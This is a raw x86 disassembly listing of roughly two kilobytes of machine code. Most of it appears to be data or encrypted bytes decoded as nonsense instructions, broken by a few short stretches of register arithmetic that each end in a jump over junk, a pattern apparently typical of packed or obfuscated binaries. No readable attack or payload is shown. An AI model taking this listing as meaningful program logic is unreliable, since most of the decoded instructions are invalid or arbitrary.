  414258:	add    esi,DWORD PTR [esi-0xc6a02d6]
  41425e:	cmp    al,0xe9
  414260:	or     ebx,ebx
  414262:	shr    DWORD PTR [ebp-0x4c],1
  414265:	pop    eax
  414266:	xor    al,0x36
  414268:	add    DWORD PTR [edi-0x5c],esi
  41426b:	or     eax,0x5e520776
  414270:	lds    ebx,FWORD PTR [ecx+0x72e0bb19]
  414276:	lods   eax,DWORD PTR ds:[esi]
  414277:	aad    0x25
  414279:	mov    esp,0xf24e7161
  41427e:	in     al,0x12
  414280:	inc    eax
  414281:	cmp    BYTE PTR [edi+0x71],al
  414284:	retf   
  414285:	dec    esp
  414286:	and    BYTE PTR [eax],al
  414288:	sub    BYTE PTR [edx-0x35],0x5e
  41428c:	or     ebp,DWORD PTR [ecx+0x220be475]
  414292:	pop    esp
  414293:	outs   dx,BYTE PTR ds:[esi]
  414294:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414295:	pop    es
  414296:	ins    DWORD PTR es:[edi],dx
  414297:	adc    al,0xe1
  414299:	ret    0xe281
  41429c:	jno    0x4142b1
  41429e:	test   DWORD PTR [ebp+0x18],edx
  4142a1:	sub    eax,0x49d3081
  4142a6:	push   es
  4142a7:	inc    ebp
  4142a8:	sub    DWORD PTR [edx-0x2b44a9cf],esp
  4142ae:	xor    al,0xad
  4142b0:	sub    eax,0x18ae7dde
  4142b5:	mov    edx,0xfaa15b82
  4142ba:	imul   edi,edi,0x4e0de8bb
  4142c0:	out    dx,al
  4142c1:	jecxz  0x414273
  4142c3:	pop    ss
  4142c4:	push   es
  4142c5:	mov    ah,0x55
  4142c7:	iret   
  4142c8:	rol    DWORD PTR [ebp+ebx*8-0xa6cd3a5],1
  4142cf:	call   0xc22b2b6c
  4142d4:	dec    DWORD PTR [ecx-0x32]
  4142d7:	push   eax
  4142d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4142d9:	mov    esi,0xe99ef3eb
  4142de:	pop    eax
  4142df:	ins    BYTE PTR es:[edi],dx
  4142e0:	icebp  
  4142e1:	jbe    0x414350
  4142e3:	je     0x41429d
  4142e5:	fisttp QWORD PTR [edx+0x49]
  4142e8:	fldcw  WORD PTR [ecx+0x6a720e8f]
  4142ee:	imul   esi,DWORD PTR [esi+0x40],0x3c
  4142f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4142f3:	mov    ah,0x73
  4142f5:	pop    eax
  4142f6:	xchg   esp,eax
  4142f7:	out    0x21,eax
  4142f9:	xchg   esp,eax
  4142fa:	fwait
  4142fb:	or     ebp,DWORD PTR [eax]
  4142fd:	std    
  4142fe:	rcr    DWORD PTR [ebx-0xa64d85e],1
  414304:	gs mov esp,0x7c6be0fa
  41430a:	(bad)
  41430d:	jg     0x4142e9
  41430f:	xor    esp,DWORD PTR [ebx-0x55]
  414312:	dec    ebp
  414313:	jp     0x4142cf
  414315:	stos   BYTE PTR es:[edi],al
  414316:	fisttp WORD PTR [ebp-0x3c]
  414319:	sub    eax,0xbe8d9bc9
  41431e:	loop   0x4142c4
  414320:	mov    edx,0x3bf400b8
  414325:	dec    esp
  414326:	push   esi
  414327:	cmp    eax,0x45197a60
  41432c:	fwait
  41432d:	mov    bl,0xc5
  41432f:	call   0x11b2:0x2589ac13
  414336:	in     eax,dx
  414337:	mov    al,ds:0x7114c02d
  41433c:	popf   
  41433d:	sub    dl,dh
  41433f:	dec    esp
  414340:	shl    DWORD PTR [ecx*4-0x3a578813],cl
  414347:	sbb    esi,DWORD PTR [edx+0x76]
  41434a:	jecxz  0x41431e
  41434c:	addr16 dec esi
  41434e:	push   esp
  41434f:	xor    bl,BYTE PTR [edi]
  414351:	jmp    eax
  414353:	push   ss
  414354:	shr    BYTE PTR [edx+ebx*8+0x4f],0x61
  414359:	(bad)  
  41435a:	loope  0x414373
  41435c:	lock mov WORD PTR ss:[edx-0x2d],?
  414361:	push   edi
  414362:	mov    bh,0xf9
  414364:	imul   edi,DWORD PTR ds:0x88dc6ab6,0x27
  41436b:	pop    edi
  41436c:	push   cs
  41436d:	rcr    DWORD PTR [esi-0x33],cl
  414370:	sbb    al,bh
  414372:	mov    es,WORD PTR [edi+0x74529f13]
  414378:	es test eax,0x48bf944
  41437e:	call   0xe3fb:0xa41f2d7e
  414385:	into   
  414386:	mov    esp,0x9f64460e
  41438b:	(bad)  
  41438c:	aas    
  41438d:	fild   QWORD PTR [esi+eiz*2]
  414390:	sub    DWORD PTR [ecx+0x230e8ccb],ecx
  414396:	out    0xb3,al
  414398:	xchg   BYTE PTR [edx+0x41ad8953],ah
  41439e:	mov    BYTE PTR [ecx+0x5e4c8757],dh
  4143a4:	dec    ebp
  4143a5:	bound  edi,QWORD PTR [edx-0x30]
  4143a8:	add    BYTE PTR [esi-0x3],0x59
  4143ac:	xor    ebx,esi
  4143ae:	adc    edi,0x1f4535a7
  4143b4:	inc    ebp
  4143b5:	mov    ch,0x67
  4143b7:	dec    esp
  4143b8:	sub    edx,ecx
  4143ba:	lea    edi,[edi+ebx*1+0x327298]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	ss mov ecx,0x9c16814
  4143ea:	jg     0x414464
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	mov    ah,0xe
  4143f2:	cwde   
  4143f3:	test   eax,0x766b6804
  4143f8:	sub    dh,dh
  4143fa:	nop
  4143fb:	icebp  
  4143fc:	jp     0x41441a
  4143fe:	sbb    cl,BYTE PTR [edx+0x64]
  414401:	addr16 jle 0x41445d
  414404:	mov    gs,WORD PTR [ebp+0x7f027f15]
  41440a:	fisub  DWORD PTR [edi+edx*4-0x292c992b]
  414411:	jg     0x41448f
  414413:	(bad)  
  414414:	(bad)  
  414415:	dec    edi
  414416:	dec    ebp
  414417:	push   ebx
  414418:	sbb    dh,BYTE PTR [esi+ebx*8]
  41441b:	fmul   QWORD PTR [edi-0x67]
  41441e:	xlat   BYTE PTR ds:[ebx]
  41441f:	adc    al,0xf5
  414421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414422:	rol    eax,cl
  414424:	lods   al,BYTE PTR ds:[esi]
  414425:	test   al,0x67
  414427:	outs   dx,BYTE PTR ds:[esi]
  414428:	dec    esp
  414429:	mov    bl,0x2e
  41442b:	mov    esi,0x26a03b3
  414430:	div    BYTE PTR [ebp+edi*2-0x69]
  414434:	mov    esp,0xaf743e9a
  414439:	pop    ebp
  41443a:	xchg   ebx,eax
  41443b:	jmp    0x481a:0x7e8b36c6
  414442:	and    DWORD PTR [eax+0x316c10fa],ecx
  414448:	in     eax,dx
  414449:	icebp  
  41444a:	retf   0xbf8a
  41444d:	inc    ebp
  41444e:	dec    ebp
  41444f:	mov    al,ds:0xea8e9a51
  414454:	cmp    ebx,DWORD PTR [ebp+esi*8+0x5b600084]
  41445b:	adc    ecx,esp
  41445d:	mov    bl,0xc5
  41445f:	aam    0x93
  414461:	call   FWORD PTR [edi-0x4d6aea02]
  414467:	sti    
  414468:	es jo  0x4144c9
  41446b:	sti    
  41446c:	out    dx,al
  41446d:	xchg   edx,eax
  41446e:	add    al,BYTE PTR [esi-0x3f]
  414471:	mov    ecx,0x2e73c738
  414476:	inc    edi
  414477:	inc    ecx
  414478:	popf   
  414479:	push   ebp
  41447a:	hlt    
  41447b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41447c:	mov    WORD PTR [ebp+0x5c],gs
  41447f:	pushf  
  414480:	xor    eax,0x62f6f56c
  414485:	inc    ecx
  414486:	adc    ah,al
  414488:	mov    edi,0xa2ec1521
  41448d:	add    DWORD PTR [edx],0xd454a218
  414493:	push   esp
  414494:	into   
  414495:	scas   al,BYTE PTR es:[edi]
  414496:	cld    
  414497:	fcomip st,st(2)
  414499:	sub    DWORD PTR [edx-0x4e],edx
  41449c:	popf   
  41449d:	out    dx,eax
  41449e:	lea    ecx,cs:[ebx]
  4144a1:	sub    eax,0x15d087fb
  4144a6:	idiv   DWORD PTR [eax]
  4144a8:	aaa    
  4144a9:	popf   
  4144aa:	call   DWORD PTR [edx+0x64]
  4144ad:	mov    es,WORD PTR [eax]
  4144af:	jnp    0x414509
  4144b1:	pusha  
  4144b2:	shr    BYTE PTR [esi],1
  4144b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4144b5:	daa    
  4144b6:	lea    ebp,[esi-0x5fc73fd3]
  4144bc:	mov    esp,0x9292da46
  4144c1:	dec    eax
  4144c2:	or     edi,DWORD PTR [ebx-0x34]
  4144c5:	or     BYTE PTR [edi],ch
  4144c7:	das    
  4144c8:	xchg   ebx,eax
  4144c9:	pop    esp
  4144ca:	and    ah,BYTE PTR [eax-0x45]
  4144cd:	fwait
  4144ce:	lds    ebp,FWORD PTR [edi-0x7e0a9f9f]
  4144d4:	mov    cl,0xa2
  4144d6:	ja     0x414517
  4144d8:	pop    esp
  4144d9:	(bad)  
  4144da:	mov    ebx,0xd807f6f6
  4144df:	popf   
  4144e0:	retf   0x66bf
  4144e3:	add    eax,0xce95d37b
  4144e8:	(bad)  
  4144e9:	je     0x41451b
  4144eb:	push   es
  4144ec:	aas    
  4144ed:	sahf   
  4144ee:	mov    ebx,0x402db77f
  4144f3:	mov    cl,0x1
  4144f5:	mov    dl,0xe5
  4144f7:	dec    ebx
  4144f8:	adc    BYTE PTR [edi-0x29bcc8e],0x5d
  4144ff:	mov    ch,cl
  414501:	cmovne ebx,DWORD PTR [esi]
  414504:	call   0x348fcc44
  414509:	mov    al,ds:0xddaeb71
  41450e:	lods   al,BYTE PTR ds:[esi]
  41450f:	rol    DWORD PTR ds:0xe63c5f49,cl
  414515:	in     eax,0xdc
  414517:	jl     0x41458d
  414519:	pop    edx
  41451a:	fld    st(3)
  41451c:	jmp    0x58fe:0x3ca1266
  414523:	jmp    0x4144c6
  414525:	cmc    
  414526:	inc    esi
  414527:	rcl    DWORD PTR [ebp-0x61],cl
  41452a:	pop    ss
  41452b:	or     ebx,DWORD PTR [eax-0x24]
  41452e:	xchg   edi,eax
  41452f:	jp     0x4145b0
  414531:	test   eax,0xdaf0b497
  414536:	or     BYTE PTR [ecx],bh
  414538:	outs   dx,BYTE PTR ds:[esi]
  414539:	push   esp
  41453a:	pushf  
  41453b:	rol    ch,cl
  41453d:	sbb    cl,BYTE PTR [eax]
  41453f:	(bad)  
  414540:	jmp    0x414500
  414542:	cmc    
  414543:	test   DWORD PTR [ebx+0x42],ebp
  414546:	mov    ecx,DWORD PTR [esi]
  414548:	ss sbb ch,cl
  41454b:	jne    0x41452d
  41454d:	cmp    BYTE PTR [eax],dh
  41454f:	pop    esi
  414550:	(bad)  
  414551:	stos   DWORD PTR es:[edi],eax
  414552:	xchg   ebp,eax
  414553:	xchg   DWORD PTR [esi-0x51bb0467],esp
  414559:	push   DWORD PTR [di+0x509e]
  41455e:	pop    ebx
  41455f:	sub    eax,DWORD PTR ss:[ecx]
  414562:	push   ds
  414563:	fwait
  414564:	mov    bl,0x1b
  414566:	mov    bl,0x6f
  414568:	xchg   ebx,eax
  414569:	dec    esp
  41456a:	add    al,BYTE PTR [edi+0xcad1cc5]
  414570:	popf   
  414571:	xchg   esp,eax
  414572:	sahf   
  414573:	cli    
  414574:	outs   dx,BYTE PTR ds:[esi]
  414575:	xor    al,0xc4
  414577:	push   cs
  414578:	xor    al,0x33
  41457a:	int    0x1e
  41457c:	adc    BYTE PTR [ebx+0x86979cf],0xa9
  414583:	inc    edi
  414584:	adc    edi,DWORD PTR [ecx]
  414586:	push   esi
  414587:	or     BYTE PTR [ebp-0x21388720],cl
  41458d:	and    eax,0xd1b4b3f6
  414592:	lds    eax,FWORD PTR [edx]
  414594:	out    0xb1,al
  414596:	not    DWORD PTR [esi+0x37]
  414599:	xchg   edi,eax
  41459a:	pop    edi
  41459b:	jp     0x4145c5
  41459d:	add    bl,BYTE PTR [edx+eax*1-0x9]
  4145a1:	sbb    BYTE PTR [edx-0x269f13cf],0x1f
  4145a8:	cmp    eax,DWORD PTR [edx-0x1]
  4145ab:	pop    eax
  4145ac:	pmovmskb esi,mm6
  4145af:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4145b0:	cli    
  4145b1:	jmp    0xd0239a14
  4145b6:	js     0x4145c0
  4145b8:	mov    bh,0x7a
  4145ba:	mov    ebp,DWORD PTR [eax]
  4145bc:	sbb    eax,0x7eba52fb
  4145c1:	outs   dx,BYTE PTR ds:[esi]
  4145c2:	lds    ecx,FWORD PTR [ebp-0x4d]
  4145c5:	or     DWORD PTR [ebp-0x48],ebx
  4145c8:	int    0x1f
  4145ca:	push   ebx
  4145cb:	stc    
  4145cc:	xor    edx,ebx
  4145ce:	popa   
  4145cf:	test   ebx,edx
  4145d1:	cmc    
  4145d2:	ret    
  4145d3:	(bad)  
  4145d4:	jecxz  0x414594
  4145d6:	sub    ebp,edi
  4145d8:	adc    DWORD PTR [ecx+0x13],eax
  4145db:	sbb    ecx,DWORD PTR [edx+0x9821757]
  4145e1:	push   edx
  4145e2:	xor    bh,BYTE PTR [esi-0x4ec8247c]
  4145e8:	add    al,0x8e
  4145ea:	cmp    BYTE PTR [eax],0x70
  4145ed:	jp     0x414579
  4145ef:	out    dx,al
  4145f0:	push   eax
  4145f1:	sbb    al,BYTE PTR [esi+0x724f4cbe]
  4145f7:	push   cs
  4145f8:	bound  esi,QWORD PTR [edx+0x2bc5aa4c]
  4145fe:	xor    bh,BYTE PTR [edi+0x2da7f4b1]
  414604:	inc    edi
  414605:	int3   
  414606:	retf   0x693c
  414609:	adc    al,0x66
  41460b:	shr    DWORD PTR [edi],cl
  41460d:	call   0x279facba
  414612:	adc    bh,BYTE PTR [ecx]
  414614:	dec    esi
  414615:	mov    eax,0xee7b71d
  41461a:	pop    ebx
  41461b:	inc    edx
  41461c:	shl    DWORD PTR [esi+0x38513ff4],1
  414622:	into   
  414623:	bound  ebx,QWORD PTR [edx-0x2a65b3ba]
  414629:	xchg   esp,eax
  41462a:	sbb    BYTE PTR [esi],ah
  41462c:	lods   al,BYTE PTR ds:[esi]
  41462d:	in     al,dx
  41462e:	mov    bh,0xd2
  414630:	inc    ebx
  414631:	cmc    
  414632:	shr    BYTE PTR [edi-0x43272e76],1
  414638:	hlt    
  414639:	popa   
  41463a:	popa   
  41463b:	pop    ds
  41463c:	scas   eax,DWORD PTR es:[edi]
  41463d:	xchg   ecx,edi
  41463f:	push   esp
  414640:	sbb    edi,ebp
  414642:	dec    eax
  414643:	ret    
  414644:	ins    DWORD PTR es:[edi],dx
  414645:	lea    edi,[esi+0x77]
  414648:	pop    esi
  414649:	mov    dl,0x5a
  41464b:	out    0xdb,eax
  41464d:	sar    BYTE PTR [ebp+0x75dbc4c3],1
  414653:	and    DWORD PTR [eax-0x16],ebx
  414656:	cmp    edi,DWORD PTR [edi]
  414658:	jo     0x4146b5
  41465a:	mov    esi,0x8bd7af0f
  41465f:	jge    0x414649
  414661:	jmp    0x4148e9
  414666:	retf   
  414667:	ret    0xd23d
  41466a:	vpand  xmm3,xmm5,xmm1
  41466e:	ret    0xb492
  414671:	and    BYTE PTR [ebp-0x5110e0de],0xf
  414678:	jg     0x4146f2
  41467a:	in     eax,0x7e
  41467c:	js     0x4146f6
  41467e:	rcr    al,1
  414680:	cli    
  414681:	fsubr  st,st(0)
  414683:	mov    ecx,0xf1df2103
  414688:	lahf   
  414689:	xor    al,0x60
  41468b:	jl     0x4146d6
  41468d:	icebp  
  41468e:	push   ss
  41468f:	mov    esp,0x49eeec1e
  414694:	sbb    BYTE PTR [eax+0x56],dl
  414697:	mov    cl,0x52
  414699:	pop    eax
  41469a:	jne    0x4146b4
  41469c:	int3   
  41469d:	call   0x7fc8:0x12a8c287
  4146a4:	jb     0x41470b
  4146a6:	mov    eax,esi
  4146a8:	xor    edx,0x7d
  4146ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4146ac:	int3   
  4146ad:	mov    cl,0xd1
  4146af:	add    DWORD PTR [ebx-0x120bcad6],ebx
  4146b5:	inc    esp
  4146b6:	leave  
  4146b7:	push   eax
  4146b8:	shl    BYTE PTR [ebx-0x76],cl
  4146bb:	stos   BYTE PTR es:[edi],al
  4146bc:	xchg   esp,eax
  4146bd:	loope  0x41470f
  4146bf:	(bad)  
  4146c0:	(bad)  [ebx-0x70]
  4146c3:	xchg   ebx,eax
  4146c4:	popf   
  4146c5:	jne    0x4146f4
  4146c7:	les    esi,FWORD PTR [ecx]
  4146c9:	test   eax,0x512b37d8
  4146cf:	rcl    DWORD PTR [ebp-0x55ef4da],cl
  4146d5:	cwde   
  4146d6:	test   DWORD PTR ds:0x1ada4ad3,0xa0bbceed
  4146e0:	int    0xf1
  4146e2:	(bad)  
  4146e3:	dec    ebp
  4146e4:	push   cs
  4146e5:	in     eax,dx
  4146e6:	(bad)  
  4146e7:	fistp  QWORD PTR [ecx+0x2c5b1012]
  4146ed:	xor    al,0x54
  4146ef:	fstp   st(4)
  4146f1:	push   edi
  4146f2:	inc    edx
  4146f3:	stc    
  4146f4:	btc    esp,eax
  4146f7:	add    BYTE PTR [ebx+0x5f],ah
  4146fa:	mov    eax,ds:0xaae9b82f
  4146ff:	sub    al,0x93
  414701:	leave  
  414702:	sbb    ch,BYTE PTR [ebp+0x7]
  414705:	fidivr DWORD PTR [ebx-0x20eb0932]
  41470b:	and    eax,0x920e615a
  414710:	sub    al,BYTE PTR [esi+0x49]
  414713:	bound  edi,QWORD PTR [esi]
  414715:	mov    al,ds:0xe2796754
  41471a:	fsub   QWORD PTR [ebx]
  41471c:	cmp    ch,BYTE PTR [ecx]
  41471e:	(bad)  
  414720:	lea    ebx,[ecx-0x316bc5a5]
  414726:	push   es
  414727:	icebp  
  414728:	jae    0x41478a
  41472a:	push   es
  41472b:	sub    DWORD PTR ds:0x1e6ed3d2,ebp
  414731:	mov    cl,0x21
  414733:	sbb    dh,BYTE PTR [eax]
  414735:	xchg   dh,dh
  414737:	(bad)  
  414738:	call   0x5a909c3c
  41473d:	cld    
  41473e:	lods   eax,DWORD PTR ds:[esi]
  41473f:	out    0x80,al
  414741:	hlt    
  414742:	mov    DWORD PTR [eax-0x7f410fd1],0x37f35a32
  41474c:	jmp    0xeaf57f0c
  414751:	fsubr  QWORD PTR [ecx-0x14]
  414754:	pop    eax
  414755:	scas   al,BYTE PTR es:[edi]
  414756:	mov    cl,bh
  414758:	xchg   DWORD PTR [ecx],ebp
  41475a:	test   edi,eax
  41475c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41475d:	inc    ecx
  41475e:	cmp    al,0xcd
  414760:	iret   
  414761:	outs   dx,BYTE PTR ds:[esi]
  414762:	fs ds jge 0x414729
  414766:	push   esp
  414767:	ret    0x926d
  41476a:	outs   dx,DWORD PTR ds:[esi]
  41476b:	or     DWORD PTR ds:0xe5b9be91,ebp
  414771:	push   ebp
  414772:	cmp    DWORD PTR [edx],ebp
  414774:	xor    eax,0x753c3048
  414779:	mov    eax,ds:0xd8144028
  41477e:	lahf   
  41477f:	cdq    
  414780:	enter  0x2b2d,0xc4
  414784:	je     0x414732
  414786:	jl     0x414745
  414788:	or     DWORD PTR [ebx],ebp
  41478a:	dec    esp
  41478b:	ret    0xca42
  41478e:	and    al,BYTE PTR [eax]
  414790:	test   al,0xe3
  414792:	mov    edx,eax
  414794:	xor    DWORD PTR [ebx+0x7e],0xffffffef
  414798:	lods   al,BYTE PTR ds:[esi]
  414799:	mov    ecx,0x1818aa58
  41479e:	fcomp  QWORD PTR [eax+0x4d]
  4147a1:	div    BYTE PTR [esi-0x1d]
  4147a4:	adc    esp,DWORD PTR [ebx-0x2c8d36dc]
  4147aa:	push   0xffffffd3
  4147ac:	aad    0x8b
  4147ae:	xchg   ebp,eax
  4147af:	test   bl,al
  4147b1:	sub    esi,DWORD PTR [esi+0x57]
  4147b4:	xor    al,0xc
  4147b6:	xor    al,0xc8
  4147b8:	popa   
  4147b9:	jne    0x41482c
  4147bb:	cdq    
  4147bc:	aas    
  4147bd:	scas   eax,DWORD PTR es:[edi]
  4147be:	push   ebp
  4147bf:	sub    edi,DWORD PTR [esi-0x76]
  4147c2:	shr    DWORD PTR [ecx-0x3db71508],1
  4147c8:	rcr    bl,cl
  4147ca:	outs   dx,DWORD PTR ds:[esi]
  4147cb:	push   ebx
  4147cc:	and    BYTE PTR gs:[esi+0x65],0xd7
  4147d1:	ror    DWORD PTR [eax+0x6f],1
  4147d4:	push   esi
  4147d5:	sbb    eax,0x38004657
  4147da:	call   0xe2588954
  4147df:	dec    ebx
  4147e0:	aam    0x93
  4147e2:	pop    ss
  4147e3:	adc    bh,al
  4147e5:	popa   
  4147e6:	call   0x85bd27c4
  4147eb:	and    al,0x31
  4147ed:	fs xchg esi,eax
  4147ef:	adc    al,0x3f
  4147f1:	push   0x7e816d60
  4147f6:	push   esp
  4147f7:	and    eax,0x485db56
  4147fc:	test   eax,0x979b488
  414801:	into   
  414802:	out    0x85,eax
  414804:	(bad)  [ecx]
  414806:	cld    
  414807:	and    al,0xb0
  414809:	push   esp
  41480a:	cmp    eax,esi
  41480c:	icebp  
  41480d:	and    edi,eax
  41480f:	icebp  
  414810:	dec    ebx
  414811:	call   0x259f1799
  414816:	sar    DWORD PTR [eax+ebx*8+0x10],0x63
  41481b:	pusha  
  41481c:	cmp    edx,DWORD PTR ds:0xfd2e7c41
  414822:	adc    BYTE PTR [edx-0x62],dh
  414825:	sbb    BYTE PTR [ebx],dh
  414827:	fist   DWORD PTR [ebx-0x50b2c885]
  41482d:	jns    0x4148a8
  41482f:	jne    0x414898
  414831:	inc    esi
  414832:	sub    eax,0xd9129731
  414837:	mov    DWORD PTR [ebp+0x24d36d5e],edx
  41483d:	sbb    BYTE PTR ds:0x634a6b46,bl
  414843:	je     0x4147d4
  414845:	popa   
  414846:	mov    cl,0x9a
  414848:	adc    dl,BYTE PTR [edi-0x38]
  41484b:	retf   
  41484c:	adc    ch,BYTE PTR [edi-0x78]
  41484f:	test   al,0xc4
  414851:	dec    esp
  414852:	aas    
  414853:	retf   0x83fc
  414856:	scas   eax,DWORD PTR es:[edi]
  414857:	mov    BYTE PTR [ebx*2-0x8866d81],cl
  41485e:	push   es
  41485f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414860:	gs push cs
  414862:	mov    edi,0xe3c50de6
  414867:	(bad)  
  414869:	add    al,0x4f
  41486b:	jmp    0xc9e2:0x47c01f87
  414872:	fcomp  QWORD PTR ds:0xd7e79c8a
  414878:	rcl    BYTE PTR [edi+eiz*8-0x12],cl
  41487c:	(bad)  
  41487e:	rcl    DWORD PTR [ebx-0x5],cl
  414881:	dec    esi
  414882:	loop   0x41482b
  414884:	dec    esi
  414885:	imul   esi,eax,0x3b10eb8a
  41488b:	dec    edx
  41488c:	adc    dl,BYTE PTR ds:0xd200cdb1
  414892:	clc    
  414893:	cmp    edx,DWORD PTR [edi]
  414895:	rol    DWORD PTR [ebx+0x32d83544],0x9c
  41489c:	mov    al,0x55
  41489e:	ret    0xbd20
  4148a1:	mov    al,0xdb
  4148a3:	jb     0x4148b3
  4148a5:	cwde   
  4148a6:	mov    edx,0x99639199
  4148ab:	mov    eax,0x73fa3680
  4148b0:	test   DWORD PTR [eax],ebp
  4148b2:	adc    ecx,DWORD PTR [ecx+0x7234b9f5]
  4148b8:	imul   DWORD PTR [edi+0x44]
  4148bb:	clc    
  4148bc:	xchg   edx,eax
  4148bd:	xchg   DWORD PTR [edx-0x131aed5c],ecx
  4148c3:	cmp    al,0x68
  4148c5:	xchg   BYTE PTR [eax-0x7f3b3c69],dh
  4148cb:	test   al,0x78
  4148cd:	addr16 add al,dh
  4148d0:	arpl   WORD PTR [ebx],dx
  4148d2:	inc    esi
  4148d3:	iret   
  4148d4:	xchg   edx,eax
  4148d5:	xor    eax,0x600f59b5
  4148da:	(bad)  
  4148dc:	push   edi
  4148dd:	jg     0x4148ad
  4148df:	xchg   esi,eax
  4148e0:	jne    0x414913
  4148e2:	add    eax,0x51b760b3
  4148e7:	push   edi
  4148e8:	mov    ds:0xd703f833,eax
  4148ed:	mov    edi,DWORD PTR [ebp-0x8]
  4148f0:	lea    edx,[edx+edi*1+0x327298]
  4148f7:	mov    DWORD PTR [ebp-0x8],edx
  4148fa:	mov    edx,DWORD PTR [ebp-0x20]
  4148fd:	xor    edx,eax
  4148ff:	mov    edi,0xffcd8d68
  414904:	sub    edi,edx
  414906:	add    edi,DWORD PTR [ebp-0x10]
  414909:	mov    edx,DWORD PTR [ebp-0x20]
  41490c:	mov    ebx,DWORD PTR [ebp-0x8]
  41490f:	jmp    0x414b97
  414914:	rcl    bh,0xc5
  414917:	(bad)  
  414918:	aad    0xda
  41491a:	leave  
  41491b:	(bad)  [eax-0x49d87ab5]
  414921:	leave  
  414922:	mov    ds:0x7f0c1b3d,al
  414927:	js     0x41490e
  414929:	jle    0x4149a3
  41492b:	js     0x41490c
  41492d:	mov    eax,ds:0xef6428d5
  414932:	push   cs
  414933:	dec    esi
  414934:	test   esp,ebx
  414936:	stos   DWORD PTR es:[edi],eax
  414937:	rcr    DWORD PTR [ebx+0x468e98ad],cl
  41493d:	mov    bl,0xdf
  41493f:	jmp    0x6dbb:0x9346ca97
  414946:	aam    0xe
  414948:	imul   edi,DWORD PTR [ebp+0x7f3f7713],0x40
  41494f:	or     BYTE PTR [edx-0x40263711],dh
  414955:	(bad)  
  414957:	ins    BYTE PTR es:[edi],dx
  414958:	sub    ax,WORD PTR [edi-0x71]
  41495c:	pop    ebp
  41495d:	pop    edi
  41495e:	out    dx,eax
  41495f:	mov    eax,0xb8778a25
  414964:	push   0x10
  414966:	shl    ch,cl
  414968:	xor    BYTE PTR [ecx+0x64],al
  41496b:	jbe    0x4149e1
  41496d:	sub    esp,ecx
  41496f:	adc    al,0x7a
  414971:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414972:	(bad)  
  414974:	test   BYTE PTR [edi-0x354a95cf],ch
  41497a:	mov    bh,0x91
  41497c:	mov    ch,0x23
  41497e:	lods   al,BYTE PTR ds:[esi]
  41497f:	mov    al,BYTE PTR [edx-0x1252a6c6]
  414985:	lahf   
  414986:	sar    DWORD PTR [ebp*2-0xfc63429],0x1a
  41498e:	mov    bh,0x91
  414990:	ja     0x414936
  414992:	sar    bl,cl
  414994:	mov    eax,es:0x3525505f
  41499a:	je     0x414928
  41499c:	mov    esi,0x542358e3
  4149a1:	sbb    edi,DWORD PTR [edi]
  4149a3:	xchg   ebx,eax
  4149a4:	sbb    DWORD PTR [ebx-0x448db0e3],eax
  4149aa:	cwde   
  4149ab:	cmp    eax,0x5a3c666e
  4149b0:	mov    al,ds:0x83cdd62d
  4149b5:	in     eax,dx
  4149b6:	fnstcw WORD PTR [ecx]
  4149b8:	push   edx
  4149b9:	in     al,dx
  4149ba:	(bad)  
  4149bb:	push   esi
  4149bc:	out    0x51,al
  4149be:	inc    ecx
  4149bf:	mov    ebx,0xfce9e2bc
  4149c4:	(bad)  
  4149c5:	aam    0xd8
  4149c7:	and    al,0x74
  4149c9:	pop    esi
  4149ca:	fcmovnbe st,st(3)
  4149cc:	mov    dl,BYTE PTR [edx-0x47ef343]
  4149d2:	test   BYTE PTR [edx-0x564d8597],cl
  4149d8:	repnz xor al,0xf9
  4149db:	jns    0x414964
  4149dd:	(bad)  
  4149de:	jmp    0x414984
  4149e0:	ja     0x4149c6
  4149e2:	jecxz  0x41499c
  4149e4:	pushf  
  4149e5:	adc    al,0x8e
  4149e7:	push   edx
  4149e8:	and    BYTE PTR [ecx],0xaf
  4149eb:	(bad)  
  4149ec:	repnz sub bh,BYTE PTR gs:[eax*1-0x74d4e35]
  4149f5:	loope  0x4149dd
  4149f7:	sub    esi,DWORD PTR [ecx-0x25]
  4149fa:	mov    eax,ds:0x64f2b015
  4149ff:	xchg   BYTE PTR [ebp+ebx*8+0x25],ch
  414a03:	dec    edx
  414a04:	jle    0x41498a
  414a06:	xchg   esp,eax
  414a07:	cmp    BYTE PTR [edi-0x11],0x78
  414a0b:	pop    esp
  414a0c:	inc    edi
  414a0d:	call   0xa41577a7
  414a12:	mov    ah,0xa8
  414a14:	adc    eax,0xf487cf0d
  414a19:	pop    edx
  414a1a:	fdivr  DWORD PTR [ecx-0x2d]
  414a1d:	mov    es,WORD PTR [ebx+0x7]
  414a20:	cs retf 0xede3
  414a24:	or     BYTE PTR [edi+0x134a0f62],bh
  414a2a:	inc    edi
  414a2b:	fidivr WORD PTR fs:[edx+0x75e511de]
  414a32:	imul   DWORD PTR [edi+0x22e2be1b]
  414a38:	jle    0x414a55
  414a3a:	jp     0x4149e4
  414a3c:	mov    ch,0xd2
  414a3e:	in     eax,0x92
  414a40:	xor    eax,0x50de9596
  414a45:	cwde   
  414a46:	push   ss
  414a47:	xchg   edi,eax
  414a48:	call   0xb05c80b9
  414a4d:	inc    edx
  414a4e:	jbe    0x414aa1
  414a50:	xlat   BYTE PTR ds:[ebx]
  414a51:	mov    eax,0xd5be5511
  414a56:	xlat   BYTE PTR ds:[ebx]
  414a57:	add    BYTE PTR [edx],bl
  414a59:	pop    es
  414a5a:	lahf   
  414a5b:	mov    dl,0xdd
  414a5d:	xchg   ebx,eax
  414a5e:	pop    ss
  414a5f:	ins    BYTE PTR es:[edi],dx
